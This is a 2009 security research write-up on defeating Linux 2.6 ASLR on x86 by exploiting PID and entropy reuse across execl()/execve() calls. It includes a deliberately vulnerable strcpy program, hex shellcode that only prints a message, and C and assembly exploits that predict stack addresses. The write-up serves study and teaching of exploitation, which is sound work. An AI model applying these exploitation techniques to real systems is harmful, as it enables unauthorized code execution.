---
layout: page
title: Attacks on Linux 2.6 Kernels ASLR, x86
---

# Attacking ASLR on Linux 2.6

## Authors

* [drraid](/drraid/)

## Introduction

<div class="note">
  <p>We have been sittig on the majority of this research for a long time, and finally after enough prodding drraid got off his lazy ass and wrote up some of it for publication. This document is NOT complete but is alive; SophSec is constantly observing protection mechanisms and performing various levels of research to defeat them. This write up is incomplete, however will ideally be added to as we find the time to document our work. There may also be incorrect assumptions made based on observations, if you discover discrepancies please feel free and contact us for resolution. Most of this is repetition of existing knowledge, and we try and give respect to the originators of content where we can.</p>
</div>

ASLR, or Address Space Layout Randomization, is a buffer overflow mitigation mechanism intended to hinder the exploitation of memory corruption vulnerabilities. Traditional methods for exploiting memory corruption vulnerabilities often rely on the attacker knowing an address of memory where they can store shellcode, or knowing the memory address of a given function they wish to call (such as a libc function). If an attacker does not know the memory address layout for a target system, this style of exploitation becomes much more difficult. Starting in version 2.6.12, ASLR was enabled by default in the Linux kernel. This implementation has randomized both stack and libc addresses, ideally to prevent both shellcode and return-to-libc style attacks. Outlined in this paper is a brief overview of some of the known attacks against the Linux kernel's ASLR, as well as some in depth information and code for practical ASLR bypasses. This paper does not address the PaX implementation of ASLR, nor does it address distribution specific security modifications.   

This paper assumes a basic understanding of software exploitation, and some experience with Linux, and use of x86. Other assumptions will be made by the author, like that you're overweight and have social anxiety - amirite? You ain't gotta lie to kick it. 

# Known Attacks

Given below are some of the **known** or otherwise _obvious_ attack vectors. 

Up until 2.6.18, the `linux-gate.so` library could be used as a reference point, as it was not randomized by ASLR. By identifying the location of this library, an attacker could find an offset to a `jmp esp` instruction, which of course jumps execution to any code on the stack. Using the library offset to this instruction as a return address, stack stored shellcode could be executed, and ASLR was completely subverted. This has however been fixed in newer Linux kernels.

The book [Hacking: Art of Exploitation 2nd Edition](http://www.amazon.com/Hacking-Art-Exploitation-Jon-Erickson/dp/1593271441) by Jon Erickson illustrates a means of guessing semi-reliable stack locations by using `execl()` to call a program, as the new program inherits the image base of the previous program. This technique is also one which SophSec had taken interest in (actually, and frustratingly, discovered on our own but failed to realize that it had already been published), and is one which we will elaborate more on below in code examples. 

The **heap** and **global** variables are not randomized by the kernel's default ASLR. This means any heap or global buffer may provide a reliable, predictable location to store and jump to shellcode. This is simple and effective, and for some reason has not warranted as much public attention as other more complex or less reliable methods. 

The **Text** segment is also not randomized. _Any_ function or code that is local to the application Text segment can be jumped to reliably and predictably. This technique is nothing monumental, but often an application will provide enough of the necessary functionality to make at least some sort of exploitation possible - even if the exploitation avenue offered is multi-tiered and/or involves writing to disk, using other resources, etc. Additionally, it may be possible to locate code for a `jmp esp`, or jmp to another register, similar to the linux-gate.so technique mentioned above. Additionally, please take note to the tool [opfind](/downloads/code/opfind.c) which is located at [opfind.c](/downloads/code/opfind.c) in SophSec's code [section](/code.html). This program will scan a binary file for `jmp reg`, `jmp [reg+i]`, as well as `call reg`, and `call [reg+i]` locations which may prove convenient for exploitation depending on the nature of the memory corruption bug. 

## Elaborating on the execl() technique

This portion of the document elaborates on the how and why the `execl()` trick works. It should be noted that although SophSec was independently researching this technique for a long time, it was first published in a book by Jon Erickson. We give him **mad props** as his books (Hacking: The Art of Exploitation, [1](http://www.amazon.com/Hacking-Art-Exploitation-Jon-Erickson/dp/1593270070) & [2](http://www.amazon.com/Hacking-Art-Exploitation-Jon-Erickson/dp/1593271441)) kick ass, and he did beat us to the punch ;P. However, we do go more in-depth on why the problem exists, and try to show some tricks for more reliable exploitation.

&lt;cliche&gt; The key to breaking any mechanism is understanding it. &lt;/cliche&gt; This sounds tacky, but it's true. By understanding how and why ASLR works on Linux, breaking it becomes much easier. Luckily, understanding how open source software does any given thing is remarkably easy as the source code is readily available. Logically, the code is the easiest place to start understanding ASLR. 
	
In `fs/binfmt_elf.c` of the kernel source shows how entropy is used to offset the top of the stack at execution time:

    #ifndef STACK_RND_MASK
    #define STACK_RND_MASK (0x7ff >> (PAGE_SHIFT - 12))	/* 8MB of VA */
    #endif

    static unsigned long randomize_stack_top(unsigned long stack_top)
    {
            unsigned int random_variable = 0;
 
            if ((current->flags & PF_RANDOMIZE) &&
                    !(current->personality & ADDR_NO_RANDOMIZE)) {
                    random_variable = get_random_int() & STACK_RND_MASK;
                    random_variable <<= PAGE_SHIFT;
            }
    #ifdef CONFIG_STACK_GROWSUP
            return PAGE_ALIGN(stack_top) + random_variable;
    #else
            return PAGE_ALIGN(stack_top) - random_variable;
    #endif
    }

As can be seen above, the entropy used for offsetting the stack top is taken from an internal kernel function called `get_random_int()`. The code for `get_random_int()` looks like:

    /*
      * Get a random word for internal kernel use only. Similar to urandom but
      * with the goal of minimal entropy pool depletion. As a result, the random
      * value is not cryptographically secure but for several uses the cost of
      * depleting entropy is too high
      */
     unsigned int get_random_int(void)
     {
            /*
             * Use IP's RNG. It suits our purpose perfectly: it re-keys itself
             * every second, from the entropy pool (and thus creates a limited
             * drain on it), and uses halfMD4Transform within the second. We
             * also mix it with jiffies and the PID:
             */
            return secure_ip_id((__force __be32)(current->pid + jiffies));
    }

In the above code segment, the comments are almost more useful than the code itself. It is explained that the random value for `get_random_int()` is taken from the IP random number generator, which is only re-keyed with fresh entropy once per second. Being that the only additional information used to offset the entropy is the PID and jiffies, if a process shares the same PID as another process, _and_ if it is executed in the same time window before the entropy is updated, it will have the same "random" stack layout. The available time window for getting the same offset is actually less than a second, due to various other factors. This discrepancy may be caused by some other kernel component intentionally triggering an update of the entropy regardless of the timing; it is quite possible this happens in networking code, being that `get_random_int()` relies on the `secure_ip_id()`.

<div class="note">
  <p>Later on in a different section this paper also discusses some potential attacks to <kbd>secure_ip_id()</kbd> being used by <kbd>get_random_int()</kbd> and the implications of ASLR with network code.</p>
</div>

The jiffies being factored into the number used for stack offset has minimal impact due to the range of variance of jiffies. Sources on <a href="http://en.wikipedia.org/wiki/Jiffy_(time)">Wikipedia</a> regarding the Linux kernel indicate that the values for a jiffy are typically between 1ms and 10ms, and since 2.6.13 on x86 is by default 4ms. This low variance works in our favor for exploitation.

This is where the `execl()` technique comes in. The `exec()` family of functions execute a program of the callers choosing, and result in the current program having its process image replaced with that of the new program being executed. This also means that the newly executed program inherits the PID of its caller. In turn, if the call happens within the same entropy-update time window as when the first program was called, the new process will have the same "random" stack offset as its caller. Knowing this, an attacker can use execl() to call a target program after observing his own program's stack layout information. This defeats ASLR, as the attacker will know anything he needs to exploit the target stack.

## Attacking ASLR with execl()
	
To demonstrate this we will use a vulnerable program, and exploit it using a wrapper program which calls the vulnerable program via `execl()`. (Actually, for our example we use execve(), but being in the same family of functions, it has the same effect.) Consider the following vulnerable code sample `vuln1.c`:

    /* vuln1.c */
    #include <stdio.h>
    #include <string.h>

    void pwnme(char *s);
    int main(int argc, char *argv[])
    {
            char input[256];

            memset(input, 0, sizeof(input));
            fgets(input, sizeof(input)-1, stdin);

            pwnme(input);

            return 0;
    }
    
    void pwnme(char *s)
    {
            char buf[80];
            strcpy(buf, s);
            printf("buf = %s\n", buf);
            return;
    }

The book example stack-overflow shown above is ideally protected from exploitation by ASLR, assuming an attacker wants to use a stack buffer to store shellcode. As we will see, this isn't necessarily the case. Being that this paper already assumes the reader is familiar with stack overflows, we will not elaborate too much on finding the amount of data required to control EIP. Quick-n-dirty: the target buffer is 80 bytes big, and the prior function's EBP be pushed after EIP is, we should have 84 bytes before we start writing into EIP:
	
    drraid@vm07:~/aslr_writeup$ gcc -o vuln1 vuln1.c
    drraid@vm07:~/aslr_writeup$ objdump -M intel -d vuln1

    [..cut..]

    080484d4 <pwnme>:
    80484d4:       55                      push   ebp
    80484d5:       89 e5                   mov    ebp,esp
    80484d7:       83 ec 58                sub    esp,0x58

    [..cut..]	

    drraid@vm07:~/aslr_writeup$ ./fuzzA 83 | ./vuln1 
    buf = AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
    drraid@vm07:~/aslr_writeup$ ./fuzzA 84 | ./vuln1
    buf = AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
    Segmentation fault

Just to get a feel for the presence and effect of ASLR, one can observe the stack in gdb after various runs, or just add a `printf()` to print out the address of a stack variable. Triggering the bug and crashing several times, and then viewing some stack info, it becomes obvious the stack is changing:

    (gdb) info reg
    eax            0x5c	92
    ecx            0x0	0
    edx            0xb7fc90f0	-1208184592
    ebx            0xb7fc7ff4	-1208188940

    [..cut..]

    (gdb) info reg
    eax            0x5c	92
    ecx            0x0	0
    edx            0xb7eec0f0	-1209089808
    ebx            0xb7eeaff4	-1209094156

Both EDX and EBX have stack addresses stored, and it can be seen that they are different between runs. ASLR is working, making it difficult to predict a stack location for shellcode storage. However by using `exec()` family functions, an exploit can reliably force the target's stack to be at a known location. Given below is code for two basic programs; the first program `printstack.c` just prints its stack and exits, the other `runprint.c` prints its stack and then calls execve() to run printstack:
	
    /* printstack.c */
    #include <stdio.h>
    
    int main(int argc, char *argv[])
    {
            int x;
            printf("%p\n", &x);
    }


    /* runprint.c */
    #include <stdio.h>
    #include <unistd.h>
    
    int main(int argc, char *argv[])
    {
    	int x;
    	printf("%p\n", &x);
    	execve("./printstack", NULL, NULL);
    }

By running the program runprint multiple times, the stacks of both programs can be seen, and they are fairly close to each other:

    drraid@vm07:~/aslr_writeup$ ./runprint
    0xbff8f5b0
    0xbff8fe30
    drraid@vm07:~/aslr_writeup$ ./runprint
    0xbfea84c0
    0xbfea8d40
    drraid@vm07:~/aslr_writeup$ ./runprint
    0xbf8e8700
    0xbf8e8f80	
	
They stack addresses printed between the two programs are clearly not the same, but much closer than the variance noticed between unique runs of just the printstack program. Notice that they are also the exact same amount of offset from each other, in this case by 0x880 or 2176 bytes. This length is influenced by environmental things such as the length of path and program names - but the important part is that the stacks are at the same location besides these environmental (static) offsets.

Exploitation at this point is pretty straight forward, but for the sake of this article I am going to provide an exploit for the example. Because this write up assumes a basic exploitation background, we will not elaborate too much on the pre-requisite. Also, this is going to be a pretty dirty exploit because im lazy - but hey, it works. We will cover tricks for getting better reliability afterwards. 

Good exploit etiquette is showing your shellcode and what it does, here's some simple shellcode to print to the screen:
	
    ; "LoL Pwned!" Shellcode
    ;; stolen from dade murphy's personal library
    
    global _start;
    
    _start:
    xor ebx, ebx;
    xor edx, edx;
    xor ecx, ecx;
    push ebx;
    
    ;stackfhex generated string
    ;slight mods for passing to fgets()
    mov eax, 0x1f224566
    sub eax, 0x15010101
    push eax
    push 0x6e775020
    mov eax, 0x4c6f4c1f
    sub al, 15
    push eax;
    xor eax, eax;
    mov al, 4;
    mov bl, 1;
    mov ecx, esp;
    mov dl, 12;
    int 0x80;
    
    mov al,1;
    int 0x80;

The assembly above prints `"LoL Pwned!\n"` to the screen. It has some slight modifications to obfuscate the 0x0a, so that the `fgets()` doesn't stop reading on the shellcode. To actually exploit the vulnerable example, we will need to have something to feed in our exploit payload to stdin. Because drraid is a lazy piece of shit, we will be cheap and lazy and achieve the input to stdin of our vulnerable program through bash redirects. This will work by storing the binary of our shellcode in a file, followed by the return address (which we will get later from the program calling execve) - this results in the classic [shellcode][addr] payload format. To get the shellcode to a file we will do:

    /* write_shellcode.c */
    #include <stdio.h>
    #include <string.h>
    #include <unistd.h>
    #include <stdlib.h>

    int main(int argc, char *argv[])
    {
        char shellcode[]=
        /* 'inc ecx' nop sled */
        "\x41\x41\x41\x41\x41\x41\x41\x41"
        "\x41\x41\x41\x41\x41\x41\x41\x41"
        "\x41\x41\x41\x41\x41\x41\x41\x41"
        "\x41\x41\x41\x41\x41\x41\x41\x41"
        /* to the shellcode rockbed */
        "\x41\x41\x41\x41\x41\x31\xdb\x31"
        "\xd2\x31\xc9\x53\xb8\x66\x45\x22"
        "\x1f\x2d\x01\x01\x01\x15\x50\x68"
        "\x20\x50\x77\x6e\xb8\x1f\x4c\x6f"
        "\x4c\x2c\x0f\x50\x31\xc0\xb0\x04"
        "\xb3\x01\x89\xe1\xb2\x0c\xcd\x80"
        "\xb0\x01\xcd\x80"; /* ret here */
        write(1, shellcode, 84);
    }

The above code writes our shellcode in its binary form to stdout. We are going to use this to write the shellcode to an output file; there is probably a much cleaner way to exploit this than bash redirects, but again this is just a dirty PoC to get code execution. After we write shellcode to the file, we will use another program to give us its stack address (and in turn, the vulnerable program's stack address). This address will become our return address for our shellcode. Below is the "exploit" code to predict stack of the target application:

    /* exploit.c */
    #include <stdio.h>
    #include <stdlib.h>
    #include <sys/types.h>
    #include <sys/stat.h>
    #include <fcntl.h>
    
    int main(int argc, char *argv[])
    {
        int fd;
        int x;
    
        x = (int )&fd;
        x+= 1924;
    
        fd = open("./a", O_WRONLY | O_APPEND);
        write(fd, (char *)&x, 4);
        close(fd);
    
        execve("./vuln1", NULL, NULL);
    }

The exploit code above just opens the file `./a` and writes its stack address (added with 1924) to the end of the file. The +1924 is similar to the 2176 bytes of offset noticed during the printing of program stacks. It has been adjusted to match the size of the buffer where the data is being stored, and other environmental factors. For any given target application you will need to identify what this value needs to be, which is simple to do if you know the size of the buffer storing your shellcode and the other factors influencing how far the offset of the target stack is. The file which we write to in the code above is ultimately our payload for the vuln1 program. Following the write, we then call the vulnerable program.

**In short: if we use write_shellcode to plant our shellcode in the file './a', and then we use the exploit to append our return address to the end of './a', and then use './a' to feed into the vulnerable application after calling it with execve, we should have a decent shot at exploitation. This ofcourse assumes it is in the same time window (before the ASLR entropy updates).**

At this point, exploitation is as simple as:

    drraid@vm07:~/aslr_writeup$ ./write_shellcode > a; ./exploit < a 
    buf = AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA1.1.1.S.fE".-....Ph Pwn..LoL,P1........
      ̀...0..
    .
    LoL PwneD!

Shown above, (after being redacted for printable characters - having non-printable replaced with periods) the execution of the shellcode can be seen printing `"LoL PwneD!\n"` - game over. This demonstrates the bypass of ASLR, but it isn't as reliable as it could be. Although this works in excess of 90% of the time, more surgical exploitation can still be achieved. Since this technique is relying on a sort of "race condition" (racing to beat out the entropy update time window), then the quicker the exploit can run to execve() the better the chances are of success. An obvious answer here is to optimize the code by re-writing it in assembly. 

    ; exploit.s
    ; ooohhh yeah
    ; gotta love assembly
    global _start;
    
    _start:
    
        ; open("./a",  O_WRONLY | O_APPEND, S_IRWXU)    
        mov eax, 0x5;
        push 0x00612f2e;
        mov ebx, esp;
        mov ecx, 0x401;
        mov edx, 0x1c0; 
        int 0x80; 
    
        ; write (fd from open, esp, 4);
        mov ebx, eax;
        mov eax, 0x4;
        push esp;
        mov ecx, esp;
        mov edx, 0x4;
        int 0x80;
    
        ; execve ("./p", NULL, NULL);
        mov eax, 0x0b;
        push 0x00702f2e;
        mov ebx, esp;
        mov ecx, 0x0;
        int 0x80;

The assembly code given above is a re-write of the C code to append a stack address (in this case, the esp register) to the file which triggers the bug (here, named "a") in the local directory. It then calls "./p" with execve: ideally an attacker could create a symbolic link of "./p" to link to the target program. The idea in doing this is to be as brief as possible in execution by using the shortest amount of data possible. This is optimized and executes measurably faster than the C due to less ops. In turn, this allows an attacker a greater chance of successful exploitation in the "race-condition" against the ASLR update time window. This code will require yet another updating of the relative stack offset (what was 1924 bytes in the C example, and 2176 in the original demonstration) for proper use. The value will be dependent on the environment where exploitation is happening, however hopefully this article has conveyed enough understanding to make that process easily understood.

FIXME: THIS SECTION NEEDS FIXING UP!!! [dear reader: hopefully you get the idea by now. we plan to fix this up more. we have more stuff to write but really just wanted to get an initial draft of some content online! email my punk ass if this article dies and you want more info -drraid, 5/27/2009]
